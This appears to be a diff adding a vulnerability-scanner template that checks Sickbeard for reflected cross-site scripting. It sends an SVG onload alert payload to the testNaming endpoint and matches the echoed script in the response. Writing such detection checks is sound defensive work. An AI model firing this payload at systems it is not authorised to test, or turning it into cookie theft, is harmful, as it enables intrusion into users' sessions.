@@ -1,0 +1,31 @@
+id: "sick-beard-xss"
+name: "Sickbeard - Cross-Site Scripting"
+severity: "high"
+description: "Sickbeard contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks."
+tech:
+  - "generic"
+tags:
+  - "xss"
+  - "vuln"
+cwe: "CWE-79"
+reference: "https://sickbeard.com/"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "status"
+    status:
+      - 200
+  - type: "word"
+    part: "body"
+    words:
+      - "<svg/onload=alert(document.domain)>"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
